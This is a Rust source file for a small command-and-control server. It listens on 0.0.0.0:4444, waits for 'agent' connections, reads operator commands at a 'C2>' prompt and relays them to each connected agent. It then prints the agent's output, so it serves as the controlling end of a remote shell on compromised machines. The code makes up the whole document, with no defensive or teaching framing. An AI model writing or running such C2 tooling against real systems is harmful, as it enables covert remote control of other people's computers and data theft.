use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;

const LISTEN_ADDR: &str = "0.0.0.0:4444";

fn handle_client(mut stream: TcpStream) {
    println!("Agent connected from: {}", stream.peer_addr().unwrap());
    
    loop {
        let mut command = String::new();
        print!("C2> ");
        std::io::stdout().flush().unwrap();
        
        if std::io::stdin().read_line(&mut command).is_err() {
            println!("Failed to read command");
            break;
        }
        
        let command = command.trim();
        if command.is_empty() {
            continue;
        }
        
        if let Err(_) = stream.write_all(command.as_bytes()) {
            println!("Failed to send command. Closing connection.");
            break;
        }
        
        if command.to_lowercase() == "exit" {
            println!("Shutting down server-side session.");
            break;
        }
        
        let mut buffer = [0; 4096];
        match stream.read(&mut buffer) {
            Ok(n) if n > 0 => {
                println!("\nAgent Response:\n{}
", String::from_utf8_lossy(&buffer[..n]));
            }
            Ok(_) | Err(_) => {
                println!("Agent disconnected.");
                break;
            }
        }
    }
}

fn main() {
    let listener = TcpListener::bind(LISTEN_ADDR).expect("Failed to bind to address");
    println!("C2 server listening on {}", LISTEN_ADDR);
    
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| handle_client(stream));
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }
    }
}
